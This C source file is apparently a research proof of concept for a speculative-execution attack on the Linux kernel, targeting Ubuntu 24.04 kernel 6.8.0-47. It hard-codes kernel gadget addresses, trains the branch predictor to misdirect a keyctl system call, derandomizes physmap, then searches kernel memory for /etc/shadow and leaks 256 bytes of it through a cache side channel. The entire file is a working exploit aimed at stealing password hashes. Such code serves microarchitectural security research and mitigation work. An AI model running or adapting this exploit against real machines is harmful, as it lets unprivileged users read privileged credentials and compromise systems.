// SPDX-License-Identifier: GPL-3.0-only
/*
 * Leak /etc/shadow or measure memory leak bandwidth given the KASLR offset
 */
#define _GNU_SOURCE
#include <err.h>
#include <fcntl.h>
#include <linux/keyctl.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <syscall.h>
#include <time.h>
#include <unistd.h>

#include "../uarch-research-fw/kmod_secret/secret_ioctl.h"
#include "memtools.h"

#define RB_OFFSET 0xcc0
#define RB_SLOTS 2
#include "../lib/rb_tools.h"

#define LEAK_ROUNDS 4
#define PRECISE_ROUNDS 16
#define THRESHOLD (LEAK_ROUNDS / 4)
#define PRECISE_THRESHOLD (PRECISE_ROUNDS / 4)

#define SYS_NR_ATTACK SYS_keyctl

u64 get_kaslr_offset(void);

typedef struct kernel_addrs
{
    u64 call_gadget_ptr; // __keyctl_read_key but inlined in keyctl_read_key
    u64 leak_gadget_ptr; // under the symbol HUF_compress1X_usingCTable_internal_default
    u64 addr_gadget_ptr; // acpi_ns_check_sorted_list.part.0.isra.0 has two full sized dependent loads
    u64 page_offset_ptr; // page_offset_base symbol can be found in the System.map file
    u64 physmap_base;    // the location of physmap without KASLR
} kernel_addrs_t;

// Ubuntu 24.04 with kernel 6.8.0-47-generic
const kernel_addrs_t kernel_addrs_nokaslr = {
    /**
     * __keyctl_read_key but inlined in keyctl_read_key
     */
    .call_gadget_ptr = 0xffffffff816cd179ul,
    /**
     *  0xffffffff818962ce movzx      edx, byte ptr [r12]          410fb61424
     *  0xffffffff818962d3 mov        rbx, qword ptr [r13 + rdx*8] 498b5cd500
     */
    .leak_gadget_ptr = 0xffffffff818962ceul,
    /**
     * acpi_ns_check_sorted_list.part.0.isra.0:
     * ...
     * 0xffffffff8128f42a mov        rax, qword ptr [r13 + 8]     498b4508
     * 0xffffffff8128f42e mov        rdx, qword ptr [rax + r12]   4a8b1420
     */
    .addr_gadget_ptr = 0xffffffff8128f42aul,
    .page_offset_ptr = 0xffffffff82d37568ul,
    .physmap_base = 0xffff888000000000ul,
};

typedef struct registers
{
    u64 src_ptr;     // code snip that contains the jump instruction
    u64 dst_ptr_ptr; // jump target

    u64 base_ptr;
} registers_t;

typedef struct exp_params
{
    kernel_addrs_t *kernel_addrs;
    registers_t *train;

    u64 reload_buffer;
    u64 secret_offset;
    u64 leak_offset;

    int flip;
    int precise;
} exp_params_t;

typedef struct run_params
{
    registers_t *train;
    u64 reload_buffer;
    u64 secret_ptr;
    u64 secret_offset;
    u64 leak_offset;
    int flip;
    int precise;
} run_params_t;

// struct get_args ptrs;
const int dummy_memory;

// clang-format off
mk_snip(train_src,
    "call *(%rcx)\n"
    "ret\n"
    "int3\n"
);
// clang-format on

// clang-format off
mk_snip(train_dst,
    "syscall\n"
    "ret\n"
    "int3       \n"
);
// clang-format on

void run_exp_once(const run_params_t *params)
{
    // params
    registers_t *train = params->train;
    u64 reload_buffer = params->reload_buffer;
    u64 secret_ptr = params->secret_ptr;
    u64 secret_offset = params->secret_offset;
    u64 leak_offset = params->leak_offset;

    u64 buffer;
    u64 buflen;
    if (!params->flip)
    {
        buffer = reload_buffer + RB_OFFSET - leak_offset;
        buflen = secret_ptr - secret_offset;
    }
    else
    {
        buffer = secret_ptr - secret_offset;
        buflen = reload_buffer + RB_OFFSET - leak_offset;
    }

    if (params->precise)
    {
        for (int r = 0; r < PRECISE_ROUNDS; ++r)
        {
            rb_flush();

            for (volatile int i = 0; i < 10; ++i)
                ;

            u64 sys_nr = SYS_NR_ATTACK;
            register u64 buffer_reg asm("rdx") = buffer;
            register u64 buflen_reg asm("r10") = buflen;
            // clang-format off
        asm volatile(
            "lea 1f(%%rip), %%r11\n"
            "pushq %%r11\n"
            "jmp *%0\n"
            "1:\n"
            :
            :"b"(train->src_ptr), "c"(train->dst_ptr_ptr),
             "a"(sys_nr), "D"(KEYCTL_READ), "S"(KEY_SPEC_SESSION_KEYRING), "d"(buffer_reg), "r"(buflen_reg)
            : "r11"
        );
            // clang-format on

            rb_reload();
        }
    }
    else
    {
        for (int r = 0; r < LEAK_ROUNDS; ++r)
        {
            rb_flush();

            for (volatile int i = 0; i < 10; ++i)
                ;

            u64 sys_nr = SYS_NR_ATTACK;
            register u64 buffer_reg asm("rdx") = buffer;
            register u64 buflen_reg asm("r10") = buflen;
            // clang-format off
        asm volatile(
            "lea 1f(%%rip), %%r11\n"
            "pushq %%r11\n"
            "jmp *%0\n"
            "1:\n"
            :
            :"b"(train->src_ptr), "c"(train->dst_ptr_ptr),
             "a"(sys_nr), "D"(KEYCTL_READ), "S"(KEY_SPEC_SESSION_KEYRING), "d"(buffer_reg), "r"(buflen_reg)
            : "r11"
        );
            // clang-format on

            rb_reload();
        }
    }
}

int check_signal(const run_params_t *params)
{
    rb_reset();
    run_exp_once(params);

    // if the best match has enough hits we return it
    size_t maxi = rb_max_index(rb_hist, RB_SLOTS - 1);
    if (params->precise)
    {
        if (rb_hist[maxi] > PRECISE_THRESHOLD)
        {
            return 1;
        }
    }
    else
    {
        if (rb_hist[maxi] > THRESHOLD)
        {
            return 1;
        }
    }

    return 0;
}

int find_byte(const exp_params_t *params, u64 secret_ptr, uint8_t previous_byte, uint8_t *byte)
{
    run_params_t run_params = {
        .train = params->train,
        .reload_buffer = params->reload_buffer,
        .secret_ptr = secret_ptr,
        .secret_offset = params->secret_offset,
        .leak_offset = params->leak_offset,
        .flip = params->flip,
        .precise = params->precise,
    };

    // find the right cache line
    int cache_line = -1;
    for (int i = 0; i < 32; ++i)
    {
        run_params.reload_buffer = params->reload_buffer - (i * 64);
        if (check_signal(&run_params))
        {
            cache_line = i;
            break;
        }
    }
    if (cache_line == -1)
    {
        return 0;
    }

    // find the right offset inside the cache line
    for (int i = 0; i < 8; ++i)
    {
        run_params.reload_buffer = params->reload_buffer - (cache_line * 64) + ((i + 1) << 3);
        if (!check_signal(&run_params))
        {
            *byte = (cache_line << 3) | (8 - (i + 1));
            return 1;
        }
    }

    return 0;
}

void leak_memory(exp_params_t *params, u64 secret_ptr, uint8_t *buf, size_t num_bytes)
{
    int previous_byte = -1;
    for (int i = 0; i < num_bytes; ++i)
    {
        uint8_t byte = 0;

        // we have seen cases where we get stuck so limit the number of tries and accept a mistake when getting stuck
        for (int j = 0; j < 1000; ++j)
        {
            if (find_byte(params, secret_ptr + i, previous_byte, &byte))
                break;
        }

        buf[i] = byte;
        previous_byte = byte;
    }
}

const char ETC_SHADOW_START[] = "root:$6$";
u64 find_etc_shadow(exp_params_t *params, u64 physmap_addr)
{
    INFO("### search /etc/shadow ###");
    // search from the back as the file cache on our server seems to be located there???
    for (u64 offset = 0; offset < (8 * 1024 * 1024) + (1024 * 1024); offset++)
    {
        if (offset % 0x10000 == 0)
        {
            printf("\nsearching at 0x%016lx: ", (physmap_addr + (offset << 12)));
        }
        if (offset % 0x1000 == 0)
        {
            printf(".");
            fflush(stdout);
        }

        // this performs an IBPB
        int c;
        for (c = 0; c < sizeof(ETC_SHADOW_START) - 1; ++c)
        {
            run_params_t run_params = {
                .train = params->train,
                .reload_buffer = params->reload_buffer - (ETC_SHADOW_START[c] << 3),
                .secret_ptr = (physmap_addr + (offset << 12)) + (c),
                .secret_offset = params->secret_offset,
                .leak_offset = params->leak_offset,
                .flip = params->flip,
            };

            if (check_signal(&run_params))
            {
                continue;
            }
            // we need two tries to actually get the signal through. prob. because nothing is cached and it is two dependent loads
            // if (check_signal(&run_params))
            //{
            //    continue;
            //}

            // the expected character was not found
            break;
        }

        if (c == sizeof(ETC_SHADOW_START) - 1)
        {
            printf("\n");
            u64 shadow_addr = (physmap_addr + (offset << 12));
            INFO("shadow_addr: 0x%016lx\n\n", shadow_addr);
            return shadow_addr;
        }
    }

    err(1, "shadow not found");
}

u64 find_rb_offset(exp_params_t *params)
{
    registers_t *train = params->train;

    for (u64 offset = 1; offset <= (16 * 1024); ++offset)
    {
        run_params_t run_params = {
            .train = train,
            .secret_ptr = params->kernel_addrs->page_offset_ptr,
            .reload_buffer = offset << 21,
            .secret_offset = params->secret_offset,
            .leak_offset = params->leak_offset,
            .flip = params->flip,
        };
        if (check_signal(&run_params))
        {
            return offset;
        }
    }

    return 0;
}

u64 find_physmap_offset(exp_params_t *params, u64 rb_offset)
{
    registers_t *train = params->train;

    // now we try to find the reload buffer full address based on the offset
    for (u64 big_offset = 0; big_offset < 0x10000; ++big_offset)
    {
        run_params_t run_params = {
            .train = train,
            .secret_ptr = params->kernel_addrs->physmap_base + (big_offset << 30) + (rb_offset << 21) + RB_OFFSET,
            .reload_buffer = 0x1000,
            .secret_offset = params->secret_offset,
            .leak_offset = params->leak_offset,
            .flip = params->flip,
        };
        if (check_signal(&run_params))
        {
            return big_offset;
        }
    }

    return 0xFFFFFFFFFFFFFFFF;
}

u64 find_reload_buffer(exp_params_t *params, u64 *physmap_addr_ptr)
{
    INFO("### search reload buffer ###\n");

    u64 rb_offset = find_rb_offset(params);
    if (!rb_offset)
    {
        ERROR("Failed to get rb_offset");
        return 0;
    }

    u64 physmap_offset = find_physmap_offset(params, rb_offset);
    if (physmap_offset == 0xFFFFFFFFFFFFFFFFul)
    {
        ERROR("Failed to get physmap_offset");
        return 0;
    }

    u64 physmap_addr = params->kernel_addrs->physmap_base + (physmap_offset << 30);
    if (physmap_addr_ptr)
    {
        *physmap_addr_ptr = physmap_addr;
    }

    u64 rb_addr = physmap_addr + (rb_offset << 21);
    INFO("rb_addr: 0x%016lx\n", rb_addr);

    printf("\n");

    return rb_addr;
}

void cpus_pin_thread(int thread)
{
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(thread, &set);
    sched_setaffinity(0, sizeof(set), &set);
}

int main(int argc, char *argv[])
{
    clock_t start_setup = clock();

    rb_init();
    srandom(getpid());
    cpus_pin_thread(2);

    u64 kernel_offset = get_kaslr_offset();

    kernel_addrs_t kernel_addrs_kaslr = {
        .call_gadget_ptr = kernel_addrs_nokaslr.call_gadget_ptr + kernel_offset,
        .leak_gadget_ptr = kernel_addrs_nokaslr.leak_gadget_ptr + kernel_offset,
        .addr_gadget_ptr = kernel_addrs_nokaslr.addr_gadget_ptr + kernel_offset,
        .page_offset_ptr = kernel_addrs_nokaslr.page_offset_ptr + kernel_offset,
        .physmap_base = kernel_addrs_nokaslr.physmap_base,
    };

    // create the training setup
    code_snip_t train_src_snip;
    code_snip_t train_dst_snip;
    code_snip_t train_physmap_dst_snip;

    registers_t train;
    registers_t train_physmap;

    u64 train_jmp_addr = (kernel_addrs_kaslr.call_gadget_ptr & 0xFFFFFFul);
    u64 train_src_addr = train_jmp_addr;
    u64 train_dst_addr = (kernel_addrs_kaslr.leak_gadget_ptr & 0xFFFFFFFFul);
    u64 train_physmap_dst_addr = (kernel_addrs_kaslr.addr_gadget_ptr & 0xFFFFFFFFul);

    // put a branch in memory to collide with the victim call
    if (init_snip(&train_src_snip, train_src_addr, train_src))
    {
        err(1, "train_src_snip");
    }
    // a target that aligns with the disclosure gadget
    if (init_snip(&train_dst_snip, train_dst_addr, train_dst))
    {
        INFO("ts: 0x%012lx - 0x%016lx\n", train_src_addr, train_src_addr + snip_sz(train_src));
        INFO("td: 0x%012lx - 0x%016lx\n", train_dst_addr, train_dst_addr + snip_sz(train_dst));

        err(1, "train_dst_snip");
    }
    // a target that aligns with the physmap derandomization gadget
    if (init_snip(&train_physmap_dst_snip, train_physmap_dst_addr, train_dst))
    {
        INFO("ts: 0x%012lx - 0x%016lx\n", train_src_addr, train_src_addr + snip_sz(train_src));
        INFO("td: 0x%012lx - 0x%016lx\n", train_dst_addr, train_dst_addr + snip_sz(train_dst));

        err(1, "train_dst_snip");
    }

    train.dst_ptr_ptr = _ul(&train_dst_snip.ptr_u64);
    train.base_ptr = train_src_snip.ptr_u64;
    train.src_ptr = train_src_snip.ptr_u64;

    train_physmap.dst_ptr_ptr = _ul(&train_physmap_dst_snip.ptr_u64);
    train_physmap.base_ptr = train_src_snip.ptr_u64;
    train_physmap.src_ptr = train_src_snip.ptr_u64;

    exp_params_t params_physmap = {
        .kernel_addrs = &kernel_addrs_kaslr,
        .train = &train_physmap,
        .secret_offset = 0x8,
        .leak_offset = 0,
        .flip = 1,
        .precise = 1,
    };

    // find the location of the reload buffer in physmap
    u64 physmap_addr = 0;
    u64 reload_buffer;
    do {
	   reload_buffer = find_reload_buffer(&params_physmap, &physmap_addr);
    } while (!reload_buffer);
    //{
    //    ERROR("reload buffer not found\n");
    //    fflush(stdout);
    //    exit(1);
    //}

    exp_params_t params = {
        .kernel_addrs = &kernel_addrs_kaslr,
        .reload_buffer = reload_buffer,
        .train = &train,
        .secret_offset = 0,
        .leak_offset = 0,
        .flip = 0,
        .precise = 0,
    };

    // /etc/shadow leak

    u64 secret_ptr = find_etc_shadow(&params, physmap_addr);

    INFO("### leak /etc/shadow ###\n");
    fflush(stdout);
#define SECRET_SIZE 256
    uint8_t secret[SECRET_SIZE];
    params.precise = 1;
    leak_memory(&params, secret_ptr, secret, SECRET_SIZE);
    clock_t shadow_end = clock();

    INFO("/etc/shadow:\n");
    for (int i = 0; i < SECRET_SIZE; ++i)
    {
        printf("%c", secret[i]);
    }
    printf("\n");
    printf("\n");
    fflush(stdout);

    INFO("TOTAL TIME: %fs\n", ((double)(shadow_end - start_setup)) / CLOCKS_PER_SEC);
    fflush(stdout);

    // cleanup
    junmap(&train_src_snip);
    junmap(&train_dst_snip);
    junmap(&train_physmap_dst_snip);
}
